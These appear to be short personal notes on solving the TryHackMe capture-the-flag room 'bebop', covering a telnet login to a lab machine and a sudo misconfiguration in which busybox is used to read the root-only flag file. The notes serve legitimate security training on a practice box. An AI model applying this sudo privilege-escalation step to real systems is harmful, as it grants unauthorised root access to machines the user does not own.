#telnet

https://tryhackme.com/r/room/bebop

---
#### Nmap
![[Screenshot_2024-05-13_14-27-09.png]]

Telnet gave me a shell with the first flag `user.txt`
```shell
telnet 10.10.124.192 23
```

With `sudo -l`, I saw that I can sudo a binary called busy box and I've got the root flag by simply typing:
```shell
sudo /bin/busybox cat /root/root.txt
```
